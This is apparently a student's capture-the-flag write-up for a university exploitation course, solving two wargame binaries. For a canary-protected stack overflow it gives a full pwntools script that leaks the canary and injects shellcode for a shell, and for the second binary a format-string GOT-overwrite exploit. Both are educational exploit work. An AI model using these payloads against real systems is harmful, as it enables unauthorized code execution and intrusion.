war5

# z5214048
## (Rev 1)

door
=========================== 
Flag: COMP6447{study_for_midsem_it's_on_monday}

General overview of problems faced 
------------------------------------- 
## Awesome skills obtained:
* Can finally operate gdb!
* Found an amazing tool for quick maths called "SpeedCrunch"
* Learnt to use "pwnlib.util.packing.fit" instead of ~~brain~~ maths skillz

## Had to hack the program 
1. "file shellcrack"
```
ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1a53a0aa62ea610a06b85b6ba388ff2ea4fe1a9d, not stripped
```

2. Ida Free on "shellcrack"
* no win() 
* gets() -> yo
* check_canary() -> canary present


3. GDB
* 3.1 analyse what happens to be the vuln's "ret" address in stack
```
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0


"Write your data to the buffer[0xffffd4dc]."
"Write your data to the buffer[0xffffd4dc]."
```

* 3.2 GDB disables randomisation: Turning that off...

**OLD**
```
"Write your data to the buffer[0xffffd4dc]."
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0
hex(0xffffd524 - 0xffffd4dc) = 0x48
```
**NEW**
```
Write your data to the buffer[0xffbeda4c].
00:0000│ esp  0xffbeda94 —▸ 0x566448a4 (main+18) ◂— mov    eax, 0
hex(0xffbeda94-0xffbeda4c)= 0x48
```

4. GDB again. Find addresses and the offsets against one another: {gets() buffer, canary, ret} -> same as step 3 (too lazy to write novels)
5. Write script

Script/Command used 
------------------ 
``` 
#!/usr/bin/python2



from pwn import *
import time

PROGRAM_NAME = "shellcrack"
ENCODING = "ascii"
MAGIC_CHAR = 'Z'

# config local stuff
context.binary = './shellcrack'

def io_beg():
	return remote('plzpwn.me', 5001)
	#process("./shellcrack")
	#remote('plzpwn.me', 2000)
	
def io_rdy(x):
	x.recvuntil("Enter as", timeout = 3)
	x.recvline()
	return 1


# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""


def main():	
	# due to  madjick,
	# this script works (253/256)^9 * 100 percent of times which is ok I hope


	# usage
	# 1. place in the same dir as shellcrack
	# 2. work

	context.binary = "./shellcrack"
	
	fin = 0
	stage = 0
	
	# https://github.com/Gallopsled/pwntools/issues/1048#issuecomment-335915889
	shell = pwnlib.shellcraft.sh()
	shell_asm = asm(shell)
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()						
			io_rdy(io)
			
			# interesting len1 values (dec)
			# * 16 (first leak)
			# * 63 (last non affecting canary)
			# * 64 (canary set to '' (NULL byte)
			len1 = 16
			print("len 1: "+str(len1))
			pay1 = MAGIC_CHAR*len1
			io.send(pay1)			
			print("pay 1 done")
			stage = stage + 1
		elif(stage == 1):
			# CANARY
			## skip
			io.recvuntil("This is the 6447 wargaming gateway,")
			
			## new leak
			canary1 = io.recvline().strip()
			
			## get leaked canary
			canary2 = find_between_r(canary1, MAGIC_CHAR, "!")
			print("*Gotten canary! Len: "+str(len(canary2))+" ["+canary2+"]")
		
			# LEAK (stack)
			leak1 = io.recvuntil("Write your data to the buffer", timeout=2)
			
			## [0xDEADFBEEF]
			leak2 = io.recvline()
			
			## 0xDEADFBEEF
			leak2 = find_between(leak2, "[", "]")
			print("*Gotten leak at "+leak2)
			
			# FINALISE
			canary = canary2 # BIN
			leak = leak2 # number in hex

			# 214756469 bla bla
			leak_int = int(leak, 16)

			stage = stage + 1
		elif(stage == 2):
			
			pay2 = pwnlib.util.packing.fit(pieces = {
					0: shell_asm,
					48: canary,
					72: p32(leak_int)
				}, filler='\x90', length = 80)
			io.sendline(pay2)			
			print("[FINAL] pay 2 done")
			stage = stage + 1
		elif(stage == 3):
			print("now lets just wait for magic to happen... epic'ly")
			print("==============="+"BEG"+"===============")
			print(io.recvall(timeout = 2))
			print("==============="+"FIN"+"===============")
			
			io.interactive()
			stage = stage + 1
		else:
			print("done. Awesome!")
			fin = 1

if __name__ == '__main__':
	main()
```

Usage:
1. place in the same dir as shellcrack (for context)
2. run script. Because canary is required to have: no magic strings + no null bytes + no "!"'s chars, It will work with the ```((253/256)^9)*100%~=90%``` chance if run once (man I love maths)
3. Enjoy having hacked into, by catting the flag. So overall it is
```
python2 5001_shellcrack.py
cat /flag
```

formatrix
=======================
Flag: COMP6447{i_r8_th15_m0vie_4/12}

General overview of problems faced 
------------------------------------- 
Had to hack the program 
0. Find the variable in stack you control
1. Find a win() func entrypoint
2. Find a function in the global offset table to substitute, and replace it with win()
3. Craft a format string payload to do so, deploy it and here goes

PY3 Format string generator function is BR0KEN!!

Script/Command used 
------------------ 
Python 2!
```
#!/usr/bin/python2

from pwn import *

ENCODING = "ascii"

def main():	
	io = connect('plzpwn.me', 4002)
	payload = fmtstr_payload(3, {0x08049C18:0x08048536},0,'byte')
	print("pay: ["+payload+"]")
	io.recvuntil("You say:")
	io.sendline(payload)
	io.interactive()



if __name__ == '__main__':
	main()
```


